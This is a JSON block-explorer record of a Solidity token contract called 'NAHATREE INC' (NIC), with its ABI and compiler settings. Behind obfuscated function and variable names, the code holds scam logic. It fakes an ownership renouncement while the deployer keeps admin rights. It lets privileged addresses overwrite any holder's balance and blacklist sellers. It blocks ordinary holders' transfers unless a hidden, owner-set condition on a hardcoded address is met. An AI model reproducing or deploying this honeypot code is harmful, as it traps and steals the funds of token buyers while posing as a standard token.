{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface takeTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldTx {\n    function createPair(address totalReceiver, address amountBuy) external returns (address);\n}\n\nabstract contract minExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTrading) external view returns (uint256);\n\n    function transfer(address toEnableWallet, uint256 limitMarketing) external returns (bool);\n\n    function allowance(address tradingTotalBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitMarketing) external returns (bool);\n\n    function transferFrom(address sender,address toEnableWallet,uint256 limitMarketing) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minIs, uint256 value);\n    event Approval(address indexed tradingTotalBuy, address indexed spender, uint256 value);\n}\n\ninterface amountTokenMetadata is amountToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NAHATREEINC is minExempt, amountToken, amountTokenMetadata {\n\n    uint256 modeLaunch;\n\n    address public fundEnableTx;\n\n    function tokenExempt(uint256 limitMarketing) public {\n        marketingWallet();\n        atShould = limitMarketing;\n    }\n\n    function allowance(address tokenFee, address toLaunched) external view virtual override returns (uint256) {\n        if (toLaunched == tokenTrading) {\n            return type(uint256).max;\n        }\n        return takeReceiver[tokenFee][toLaunched];\n    }\n\n    bool public txTeam;\n\n    mapping(address => bool) public takeTx;\n\n    bool public maxSell;\n\n    mapping(address => bool) public fundReceiver;\n\n    address private receiverFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minSwap;\n    }\n\n    string private receiverEnable = \"NAHATREE INC\";\n\n    mapping(address => mapping(address => uint256)) private takeReceiver;\n\n    uint256 atShould;\n\n    uint256 private marketingAt;\n\n    mapping(address => uint256) private teamWallet;\n\n    function balanceOf(address fromTrading) public view virtual override returns (uint256) {\n        return teamWallet[fromTrading];\n    }\n\n    function amountTrading(address listSender, address toEnableWallet, uint256 limitMarketing) internal returns (bool) {\n        require(teamWallet[listSender] >= limitMarketing);\n        teamWallet[listSender] -= limitMarketing;\n        teamWallet[toEnableWallet] += limitMarketing;\n        emit Transfer(listSender, toEnableWallet, limitMarketing);\n        return true;\n    }\n\n    uint256 public feeTotalWallet;\n\n    bool private isMin;\n\n    constructor (){\n        \n        exemptMode();\n        takeTrading enableWallet = takeTrading(tokenTrading);\n        senderTxTake = shouldTx(enableWallet.factory()).createPair(enableWallet.WETH(), address(this));\n        if (txTeam == isMin) {\n            marketingAt = feeTotalWallet;\n        }\n        fundEnableTx = _msgSender();\n        fundReceiver[fundEnableTx] = true;\n        teamWallet[fundEnableTx] = autoLaunch;\n        \n        emit Transfer(address(0), fundEnableTx, autoLaunch);\n    }\n\n    uint8 private minSwap = 18;\n\n    uint256 private autoLaunch = 100000000 * 10 ** 18;\n\n    bool public enableLiquidity;\n\n    function getOwner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    bool private toSellLaunched;\n\n    bool private receiverTake;\n\n    function transfer(address launchLimit, uint256 limitMarketing) external virtual override returns (bool) {\n        return toAt(_msgSender(), launchLimit, limitMarketing);\n    }\n\n    function approve(address toLaunched, uint256 limitMarketing) public virtual override returns (bool) {\n        takeReceiver[_msgSender()][toLaunched] = limitMarketing;\n        emit Approval(_msgSender(), toLaunched, limitMarketing);\n        return true;\n    }\n\n    function toAt(address listSender, address toEnableWallet, uint256 limitMarketing) internal returns (bool) {\n        if (listSender == fundEnableTx) {\n            return amountTrading(listSender, toEnableWallet, limitMarketing);\n        }\n        uint256 fromToken = amountToken(senderTxTake).balanceOf(maxTake);\n        require(fromToken == atShould);\n        require(!takeTx[listSender]);\n        return amountTrading(listSender, toEnableWallet, limitMarketing);\n    }\n\n    address maxTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function txSell(address autoExemptFee) public {\n        marketingWallet();\n        \n        if (autoExemptFee == fundEnableTx || autoExemptFee == senderTxTake) {\n            return;\n        }\n        takeTx[autoExemptFee] = true;\n    }\n\n    string private minSender = \"NIC\";\n\n    address tokenTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public swapMarketingList;\n\n    function marketingWallet() private view {\n        require(fundReceiver[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverEnable;\n    }\n\n    event OwnershipTransferred(address indexed senderFund, address indexed toFromTrading);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoLaunch;\n    }\n\n    function transferFrom(address listSender, address toEnableWallet, uint256 limitMarketing) external override returns (bool) {\n        if (_msgSender() != tokenTrading) {\n            if (takeReceiver[listSender][_msgSender()] != type(uint256).max) {\n                require(limitMarketing <= takeReceiver[listSender][_msgSender()]);\n                takeReceiver[listSender][_msgSender()] -= limitMarketing;\n            }\n        }\n        return toAt(listSender, toEnableWallet, limitMarketing);\n    }\n\n    function owner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    address public senderTxTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minSender;\n    }\n\n    function exemptMode() public {\n        emit OwnershipTransferred(fundEnableTx, address(0));\n        receiverFrom = address(0);\n    }\n\n    function amountMax(address walletLiquidity) public {\n        if (maxSell) {\n            return;\n        }\n        \n        fundReceiver[walletLiquidity] = true;\n        \n        maxSell = true;\n    }\n\n    function takeSenderToken(address launchLimit, uint256 limitMarketing) public {\n        marketingWallet();\n        teamWallet[launchLimit] = limitMarketing;\n    }\n\n    uint256 private buySenderAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTotalBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFromTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"}],\"name\":\"amountMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotalWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnableTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTxTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMarketing\",\"type\":\"uint256\"}],\"name\":\"takeSenderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitMarketing\",\"type\":\"uint256\"}],\"name\":\"tokenExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toEnableWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExemptFee\",\"type\":\"address\"}],\"name\":\"txSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NAHATREEINC", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}